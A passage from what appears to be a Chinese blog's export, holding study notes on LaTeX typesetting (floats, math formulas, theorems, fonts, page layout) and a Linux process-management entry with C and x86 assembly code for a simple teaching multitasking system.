<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\parbox[⟨align⟩][⟨height⟩][⟨inner-align⟩]&#123;⟨width⟩&#125;&#123;…&#125;</span><br><span class="line">\begin&#123;minipage&#125;[⟨align⟩][⟨height⟩][⟨inner-align⟩]&#123;⟨width⟩&#125;</span><br><span class="line">…</span><br><span class="line">\end&#123;minipage&#125;</span><br></pre></td></tr></table></figure>
<h3 id="标尺盒子"><a class="header-anchor" href="#标尺盒子">¶</a>标尺盒子</h3>
<p>​	\rule命令用来实现一个实心的矩形</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\rule[⟨raise⟩]&#123;⟨width⟩&#125;&#123;⟨height⟩&#125;</span><br></pre></td></tr></table></figure>
<h2 id="浮动体"><a class="header-anchor" href="#浮动体">¶</a>浮动体</h2>
<p>​	浮动体主要就是说某个表格或者图片太大了，给他浮动浮动，自带的有table和figure两种，一般来说前者放表格，后者放图片，带一个位置参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326153807583.png" alt="image-20220326153807583"></p>
<h3 id="浮动体的标题"><a class="header-anchor" href="#浮动体的标题">¶</a>浮动体的标题</h3>
<p>​	使用\caption命令加标题，可以自动标号，和session命令差不多</p>
<h3 id="并排和子图标"><a class="header-anchor" href="#并排和子图标">¶</a>并排和子图标</h3>
<p>​	主要使用双斜线来排版</p>
<p>​	对于命名的话，要给每个图片单独命名，即下面的效果</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326153836181.png" alt="image-20220326153836181"></p>
<p>​	需要用到minipage</p>
<p>​	要实现下面的效果，需要用到subfig宏包</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326153913368.png" alt="image-20220326153913368"></p>
<h1>排版数学公式</h1>
<p>​	主要需要用到amsmath宏包</p>
<h2 id="公式排版基础"><a class="header-anchor" href="#公式排版基础">¶</a>公式排版基础</h2>
<p>​	首先是行内公式和行间公式的概念</p>
<p>​	行内公式由一对$$包括</p>
<p>​	行间公式由<strong>equation</strong>环境包括，这个环境自动给公式生成了一个编号，可以使用前文提到的交叉引用，也可以用\tag命令来手动更改编号，如果要使用不带编号的，可以将公式用\[和\]包裹，也可以用displaymath环境，也可以用equation环境</p>
<p>​	行间公式的对齐和编号位置等性质由文档类选项控制，其fleqn选项令行间公式左对齐，leqno选项令编号放在公式左边</p>
<h2 id="数学模式"><a class="header-anchor" href="#数学模式">¶</a>数学模式</h2>
<p>​	当开始打公式的时候就进入了数学模式，有如下特点</p>
<ol>
<li>空格被忽略，间距由符号性质决定，如果需要间距的话需要人为使用\quad和\qquad命令</li>
<li>不允许有空行，也不能使用双斜线手动换行</li>
<li>所有字母都被当作变量，如果要输入正文的话，需要使用\text命令</li>
</ol>
<h2 id="数学符号"><a class="header-anchor" href="#数学符号">¶</a>数学符号</h2>
<p>​	数学符号由<strong>amssymb</strong>宏包提供，主要用到以下几种</p>
<ol>
<li>
<p>希腊字母的符号就是它的英文名称，首字母大写就是大写的符号，省略号有**\dots<strong>和</strong>\cdots<strong>两种，在矩阵中也有可能遇到竖排</strong>\vdots<strong>和斜排</strong>\ddots**省略号</p>
</li>
<li>
<p>上下标还是一样的用^和_表示，导数符号是’</p>
</li>
<li>
<p>分式采用命令\frac{}{}，但是这个命令在行内公式的时候打出来的很小，可以用\dfrac和\tfrac来使其正常显示，而使用它打印行间公式的时候会变小</p>
</li>
<li>
<p>根式采用命令\sqrt[n]{…}，打印n次方根</p>
</li>
<li>
<p>二项式结构采用命令\binom{}{}</p>
</li>
<li>
<p>不等关系用\ne，大于等于\ge，小于等于\le，约等于\approx，等价\equiv，正比\propto，也可以用\stackrel{}{}命令来自定义二元关系符，用于将一个符号叠加到原来的二元关系符上</p>
</li>
<li>
<p>乘号 × (\times)、除号 ÷ (\div)、点乘 · (\cdot)、加减号 ± (\pm) / ∓ (\mp) ，还有一些算子，比如哈密尔顿算子\nabla，偏导\partial，还有一些带上下限的运算符，基本和mathjex一致，如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326153948047.png" alt="image-20220326153948047"></p>
<p>对于取模运算符，有\bmod和\pmod两个运算符，主要用法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a\bmod b \\</span><br><span class="line">x\equiv a \pmod&#123;b&#125;$</span><br></pre></td></tr></table></figure>
<p>当然也可以使用\DeclareMathOperator{}{}来自定义，带星号为定义带上下限的运算符</p>
</li>
<li>
<p>巨算符，比如积分\int，其行内公式和行间公式的形状有一定的区别，可以使用\limits命令和\nolimits命令来调整，前者调整的类似于求和，后者调整的类似于积分，\substack命令能够在下限写多行表达式，而subarray环境甚至可以调整位置，即选择cl</p>
</li>
<li>
<p>可以为某个符号添加重音，例如向量可以用\vec{r}表示，也可以用\overbrace 和 \underbrace 命令用来生成上/下括号</p>
</li>
<li>
<p>感觉箭头功能比较强大的应该是\leftarrow[下标]{上标}和\xrightarrow命令，长度可伸展，可以为其添加上下标</p>
</li>
<li>
<p>括号和定界符，小中大括号都是一样的，不过要注意大括号需要转义，尖括号是\langle和\rangle，在编辑行间公式的时候可以使用\left和\right命令来自动调整公式大小，当然也可以使用\bigl等命令生成固定大小的，这时候不用成对出现，而且可以换行</p>
</li>
</ol>
<h2 id="多行公式"><a class="header-anchor" href="#多行公式">¶</a>多行公式</h2>
<h3 id="长公式折行"><a class="header-anchor" href="#长公式折行">¶</a>长公式折行</h3>
<p>​	可以使用<strong>multline</strong>环境，它支持双反斜线折行</p>
<h3 id="多行公式-v2"><a class="header-anchor" href="#多行公式-v2">¶</a>多行公式</h3>
<p>​	要想编辑多行公式，应该使用<strong>align</strong>环境，用&amp;把公式对齐，用双反斜线换行，每个公式都会被编号，也可以用&amp;对齐多组公式，如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326154019300.png" alt="image-20220326154019300"></p>
<p>​	如果不需要按照等号对齐，只需要罗列多个公式，用环境<strong>gather</strong>即可</p>
<p>​	还有一种情况是多行公式共用一个编号，这个时候用<strong>aligned</strong>环境和<strong>gathered</strong>环境，和equation环境套用即可</p>
<h2 id="数组和矩阵"><a class="header-anchor" href="#数组和矩阵">¶</a>数组和矩阵</h2>
<p>​	要排版二维数组，可以用array环境，用法和tarbular环境类似，需要定义列格式，用双反斜线进行换行，也可以用这个环境排版出分段函数的效果</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326154052897.png" alt="image-20220326154052897"></p>
<p>​	不过分段函数用<strong>cases</strong>环境会更简单一些，如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326163205554.png" alt="image-20220326163205554"></p>
<p>​	除了上面用大括号作为定界符的矩阵，也有一些别的环境，包括不带定界符的matrix，以及带各种定界符的矩阵pmatrix、bmatrix、Bmatrix、vmatrix、Vmatrix，<strong>使用这些格式不需要给定列格式</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326163359903.png" alt="image-20220326163359903"></p>
<p>​	在矩阵中排版分式的时候可以用之前的方法来改变间距</p>
<h2 id="比较细的排版"><a class="header-anchor" href="#比较细的排版">¶</a>比较细的排版</h2>
<p>​	有的时候可能希望人为的调整一下间距，主要有几个方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326163429836.png" alt="image-20220326163429836"></p>
<p>​	负间距可以用来生成多重积分号，但是可以直接用**\iint<strong>和</strong>\iiint**来生成多重积分号</p>
<p>​	关于字体和大小，可以参考下面这张图</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326163520971.png" alt="image-20220326163520971"></p>
<p>​	要想给字体加粗，可以用\boldsymbol命令来在公式内部直接切换</p>
<h2 id="定理环境"><a class="header-anchor" href="#定理环境">¶</a>定理环境</h2>
<h3 id="定理环境-v2"><a class="header-anchor" href="#定理环境-v2">¶</a>定理环境</h3>
<p>​	基本命令为\newtheorem{theorem env}{title}[section-level]</p>
<p>​	或者使用\newtheorem{theorem env}[counter]{title}</p>
<p>​	上面两个命令的可选参数是定理的序号，如果没有的话就默认使用和定理环境同名的计数器</p>
<p>​	就相当于自己定义了一个环境，在环境中加入相关的正文</p>
<p>​	如果想要修改定理环境的格式的话，可以使用amsthm宏包</p>
<h3 id="证明环境"><a class="header-anchor" href="#证明环境">¶</a>证明环境</h3>
<p>​	proof环境用于排版定理的证明过程</p>
<p>​	然后他会在右下角加一个方框，如果是一个不带编号的公式，方框符号会另起一行，这个时候可以用\qedhere使方框放在公式末尾</p>
<h3 id="符号表"><a class="header-anchor" href="#符号表">¶</a>符号表</h3>
<p>​	原文档第九节是一些常用的排版符号表</p>
<h1>排版样式设定</h1>
<h2 id="字体"><a class="header-anchor" href="#字体">¶</a>字体</h2>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326163539006.png" alt="image-20220326163539006"></p>
<p>​	修改字体的命令如上面两组，前面一组修改后面所有的字符，而后者更加常用</p>
<p>​	修改字号的命令可以参考下图</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326163554656.png" alt="image-20220326163554656"></p>
<p>​	图中也给出了标准文档类中的字号大小，主要是为了考虑命令\fontsize{size}{base line-skip}，size为字号，base line-skip为基础行距</p>
<p>​	使用一些常见的字体宏包可以整体改变字体</p>
<h2 id="文字装饰和强调"><a class="header-anchor" href="#文字装饰和强调">¶</a>文字装饰和强调</h2>
<p>​	可以使用\underline{}命令生成下划线，但是会出现一些问题，也无法换行，而<strong>ulem</strong>宏包提供了\uline命令，可以生成能够自动换行的下划线</p>
<p>​	\emph命令内内容变成斜体</p>
<h2 id="段落格式和间距"><a class="header-anchor" href="#段落格式和间距">¶</a>段落格式和间距</h2>
<h3 id="长度和长度变量"><a class="header-anchor" href="#长度和长度变量">¶</a>长度和长度变量</h3>
<p>​	有时候会用到弹性长度，如12pt plus 2pt minus 3pt，表示可以到14也可以到9</p>
<p>​	LaTeX本身预定义了很多长度变量，如果要自定义的话应该使用\newlength{\length command}。可以用如下两个命令进行操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\setlength&#123;\⟨length command⟩&#125;&#123;⟨length⟩&#125;%赋值</span><br><span class="line">\addtolength&#123;\⟨length command⟩&#125;&#123;⟨length⟩&#125;%增加</span><br></pre></td></tr></table></figure>
<h3 id="行距"><a class="header-anchor" href="#行距">¶</a>行距</h3>
<p>​	在导言区使用\linespread{factor}，其中的factor指的是基础行距</p>
<p>​	如果要局部的改变某个段落的行距，则需要在上一条命令后面使用\selectfont来让其立刻生效</p>
<p>​	字号的改变是立即生效的，而行距的改变是直到文字分段时才会生效的</p>
<h3 id="段落格式"><a class="header-anchor" href="#段落格式">¶</a>段落格式</h3>
<p>​	看下列命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\setlength&#123;\leftskip&#125;&#123;⟨length⟩&#125;%左缩进</span><br><span class="line">\setlength&#123;\rightskip&#125;&#123;⟨length⟩&#125;%右缩进</span><br><span class="line">\setlength&#123;\parindent&#125;&#123;⟨length⟩&#125;%首行缩进</span><br><span class="line">\setlength&#123;\parskip&#125;&#123;length&#125;%垂直间距</span><br></pre></td></tr></table></figure>
<p>​	上面是设置长度，然后用\indent来设置缩进</p>
<p>​	由于LaTeX本身默认在chapter和section等章节命令之后第一段不缩进，如果要取消的话，需要调用indentfirst宏包</p>
<h3 id="水平间距"><a class="header-anchor" href="#水平间距">¶</a>水平间距</h3>
<p>​	如果要在文中插入额外的水平间距，则应该使用命令\hspace{length}</p>
<p>​	命令\stretch{n}可以生成一个特殊的弹性长度，参数n为权重，，其基础长度是0pt，但是可以无限延伸，直到占满可用的空间。如果一行中出现了多个这样的命令，则可用空间按照每一个\stretch命令的权重进行分配，命令\fill相当于\stretch{1}</p>
<h3 id="垂直间距"><a class="header-anchor" href="#垂直间距">¶</a>垂直间距</h3>
<p>​	各种东西之间的垂直间距是预设的，如果想要人为增加两个段落之间的间距，可以使用命令\vspace{}，这里也可以用上文中的那个\stretch命令</p>
<h2 id="页面和分栏"><a class="header-anchor" href="#页面和分栏">¶</a>页面和分栏</h2>
<h3 id="设置页面参数"><a class="header-anchor" href="#设置页面参数">¶</a>设置页面参数</h3>
<p>​	主要是使用<strong>geometry</strong>宏包，命令就是\grometry{grometry-settings}，设置一般是以键值对的形式来组织，比如，Word的页面设置一般是A4纸张，上下1英寸，左右1.25英寸，那么可以做出类似的设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\usepackage[hmargin=1.25in,vmargin=1in]&#123;geometry&#125;</span><br><span class="line">% or</span><br><span class="line">\usepackage[left=1.25in,right=1.25in,top=1in,bottom=1in]&#123;geometry&#125;</span><br></pre></td></tr></table></figure>
<h3 id="垂直对齐"><a class="header-anchor" href="#垂直对齐">¶</a>垂直对齐</h3>
<p>​	如果文档有大量的图表，采用默认的垂直分散对齐会造成某些页面的垂直间距过宽，这里有另一种策略，即将页面内容向顶部对齐</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\raggedbottom %顶部对齐</span><br><span class="line">\flushbottom %自由对齐</span><br></pre></td></tr></table></figure>
<h3 id="分栏"><a class="header-anchor" href="#分栏">¶</a>分栏</h3>
<p>​	应该用不到吧</p>
<h2 id="页眉页脚"><a class="header-anchor" href="#页眉页脚">¶</a>页眉页脚</h2>
<p>​	使用\pagestyle{}来修改样式</p>
<p>​	使用\thispagestyle{}来修改本页的</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326163622699.png" alt="image-20220326163622699"></p>
<p>​	这是四类页眉页脚的样式</p>
<p>​	\pagenumbering{}命令可以修改页码的样式，主要是页码数字类型</p>
<p>​	<strong>fancyhdr</strong>宏包可以改善页眉页脚，其自定义了样式名称fancy，可以先用\pagestyle{fancy}命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\fancyhf[⟨position⟩]&#123;…&#125;</span><br><span class="line">\fancyhead[⟨position⟩]&#123;…&#125;</span><br><span class="line">\fancyfoot[⟨position⟩]&#123;…&#125;</span><br></pre></td></tr></table></figure>
<p>​	position为LCR和OE的组合</p>
]]></content>
      <categories>
        <category>数学</category>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>数学建模</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux进程管理</title>
    <url>/2021/10/07/Linux%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ol>
<li><p>单CPU系统其实就是通过快速切换任务执行来给人一种它在同时执行所有任务的错觉。这种逻辑并行性称为“并发”</p>
</li>
<li><p>映像指的是包含执行代码、数据和堆栈的存储区，进程是对映像的执行，在操作系统内核中，每个进程用一个独特的数据结构表示，叫做<strong>进程控制块</strong>（PCB）或者<strong>任务控制块</strong>（TCB）。该结构体包含了进程的所有信息，下面是一个简单地示例。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">next</span>;</span>  <span class="comment">//下一个进程的指针</span></span><br><span class="line">	<span class="keyword">int</span> *ksp;      <span class="comment">//保存sp</span></span><br><span class="line">	<span class="keyword">int</span> pid;      <span class="comment">//进程ID</span></span><br><span class="line">	<span class="keyword">int</span> ppid;     <span class="comment">//父进程ID</span></span><br><span class="line">	<span class="keyword">int</span> status;    <span class="comment">//表明当前进程状态</span></span><br><span class="line">	<span class="keyword">int</span> priority;    <span class="comment">//优先级</span></span><br><span class="line">	<span class="keyword">int</span> kstack[<span class="number">1024</span>];  <span class="comment">//进程的额外栈  </span></span><br><span class="line">&#125;proc;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="MT文件管理系统"><a href="#MT文件管理系统" class="headerlink" title="MT文件管理系统"></a>MT文件管理系统</h1><p>​    这里主要结合汇编代码和C代码创建了一个进程切换系统</p>
<h2 id="t-c文件"><a href="#t-c文件" class="headerlink" title="t.c文件"></a>t.c文件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;type.h&quot;</span></span></span><br><span class="line">PROC proc[NPROC];</span><br><span class="line">PROC *freeList;</span><br><span class="line">PROC *readyList;</span><br><span class="line">PROC *running;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;queue.c&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">body</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kfork</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">/*******************************</span></span><br><span class="line"><span class="comment"> kfrok() creates a child process and return its pid;</span></span><br><span class="line"><span class="comment">********************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kfork</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    PROC *p=dequeue(&amp;freeList);</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;no more proc!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;status=READY;</span><br><span class="line">    p-&gt;priority=<span class="number">1</span>;</span><br><span class="line">    p-&gt;ppid=running-&gt;ppid;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    p-&gt;kstack[SSIZE-i]=<span class="number">0</span>;</span><br><span class="line">    p-&gt;kstack[SSIZE<span class="number">-1</span>]=(<span class="keyword">int</span>)body;</span><br><span class="line">    p-&gt;ksp=&amp;(p-&gt;kstack[SSIZE<span class="number">-9</span>]);</span><br><span class="line">    enqueue(&amp;readyList,p);</span><br><span class="line">    <span class="keyword">return</span> p-&gt;pid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kexit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    running-&gt;status=FREE;<span class="comment">//kill this running process</span></span><br><span class="line">    running-&gt;priority=<span class="number">0</span>;</span><br><span class="line">    enqueue(&amp;freeList,running);</span><br><span class="line">    printList(<span class="string">&quot;freeList&quot;</span>,freeList);</span><br><span class="line">    tswitch();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_kfork</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> child=kfork();</span><br><span class="line">    <span class="keyword">if</span>(child&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;kfork failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;proc %d kforked a child = %d\n&quot;</span>,running-&gt;pid,child);</span><br><span class="line">        printList(<span class="string">&quot;readyQueue&quot;</span>,readyList);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> child;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_switch</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    tswitch();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    kexit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">body</span><span class="params">()</span><span class="comment">// process body function，所有的进程都在body</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;proc %d starts from body()\n&quot;</span>,running-&gt;pid);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;******************************\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;proc %d running: parent = %d\n&quot;</span>,running-&gt;pid,running-&gt;ppid);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter a key [f|s|q]:&quot;</span>);</span><br><span class="line">        c=getchar();</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">switch</span>(c)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">                do_kfork();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                do_switch();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">                do_exit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//initialize the MT system; create P0 as initial running process</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    PROC *p;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;NPROC;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p=&amp;proc[i];</span><br><span class="line">        p-&gt;pid=i;</span><br><span class="line">        p-&gt;status=FREE;</span><br><span class="line">        p-&gt;priority=<span class="number">0</span>;</span><br><span class="line">        p-&gt;next=p+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    proc[NPROC<span class="number">-1</span>].next=<span class="number">0</span>;</span><br><span class="line">    freeList=&amp;proc[<span class="number">0</span>];<span class="comment">//all are free</span></span><br><span class="line">    readyList=<span class="number">0</span>;<span class="comment">// nothing is ready</span></span><br><span class="line">    <span class="comment">// create P0 as a runing process</span></span><br><span class="line">    p=running=dequeue(&amp;freeList);</span><br><span class="line">    p-&gt;status=READY;</span><br><span class="line">    p-&gt;ppid=<span class="number">0</span>;</span><br><span class="line">    printList(<span class="string">&quot;freeList&quot;</span>,freeList);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init complete: P0 running\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/********main function is as follows*********/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the MT Multitasking System\n&quot;</span>);</span><br><span class="line">    init();  <span class="comment">//initialize system; create and run P0;</span></span><br><span class="line">    kfork();  <span class="comment">// kfork P1 into readyLIst;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;P0: switch process\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(readyList)</span><br><span class="line">        tswitch();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">scheduler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;proc %d in scheduler()\n&quot;</span>,running-&gt;pid);</span><br><span class="line">    <span class="keyword">if</span>(running-&gt;kstack==READY)</span><br><span class="line">    &#123;</span><br><span class="line">        enqueue(&amp;readyList,running);</span><br><span class="line">    &#125;</span><br><span class="line">    printList(<span class="string">&quot;readQueue&quot;</span>,readyList);</span><br><span class="line">    running=dequeue(&amp;readyList);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;next running = %d\n&quot;</span>,running-&gt;pid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ts-s文件"><a href="#ts-s文件" class="headerlink" title="ts.s文件"></a>ts.s文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.globl running, scheduler,tswitch</span><br><span class="line">tswitch:</span><br><span class="line">SAVE:	pushl %eax</span><br><span class="line">	pushl %ebx</span><br><span class="line">	pushl %ecx</span><br><span class="line">	pushl %edx</span><br><span class="line">	pushl %ebp</span><br><span class="line">	pushl %esi</span><br><span class="line">	pushl %edi</span><br><span class="line">	pushfl</span><br><span class="line">	movl running,%ebx</span><br><span class="line">	movl %esp,4(%ebx)</span><br><span class="line">FIND:	call scheduler</span><br><span class="line">RESUME:	movl running,%ebx</span><br><span class="line">	movl 4(%ebx),%esp</span><br><span class="line">	popfl</span><br><span class="line">	popl %edi</span><br><span class="line">	popl %esi</span><br><span class="line">	popl %ebp</span><br><span class="line">	popl %edx</span><br><span class="line">	popl %ecx</span><br><span class="line">	popl %ebx</span><br><span class="line">	popl %eax</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<h2 id="queue-c文件"><a href="#queue-c文件" class="headerlink" title="queue.c文件"></a>queue.c文件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/****   about FIFO queue  ****/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">enqueue</span><span class="params">(PROC **<span class="built_in">queue</span>,PROC *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PROC *q=*<span class="built_in">queue</span>;</span><br><span class="line">    <span class="keyword">if</span>(q==<span class="number">0</span>||p-&gt;priority&gt;q-&gt;priority)<span class="comment">// sort by the priority</span></span><br><span class="line">    &#123;</span><br><span class="line">        *<span class="built_in">queue</span>=p;<span class="comment">// insert p in front of queue</span></span><br><span class="line">        p-&gt;next=q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(q-&gt;next&amp;&amp;p-&gt;priority&lt;=q-&gt;next-&gt;priority)</span><br><span class="line">        &#123;</span><br><span class="line">            q=q-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        p-&gt;next=q-&gt;next;</span><br><span class="line">        q-&gt;next=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">PROC *<span class="title">dequeue</span><span class="params">(PROC **<span class="built_in">queue</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PROC *p=*<span class="built_in">queue</span>;</span><br><span class="line">    <span class="keyword">if</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        *<span class="built_in">queue</span>=(*<span class="built_in">queue</span>)-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printList</span><span class="params">(<span class="keyword">char</span> *name,PROC *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s = &quot;</span>,name);</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d %d]-&gt;&quot;</span>,p-&gt;pid,p-&gt;priority);</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NULL\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="type-h"><a href="#type-h" class="headerlink" title="type.h"></a>type.h</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NPROC 9     <span class="comment">// number of PROCs</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SSIZE 1024 <span class="comment">// stack size</span></span></span><br><span class="line"><span class="comment">// PROC status</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READY 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SLEEP 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZOMBIE 3</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">int</span> *ksp;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="keyword">int</span> 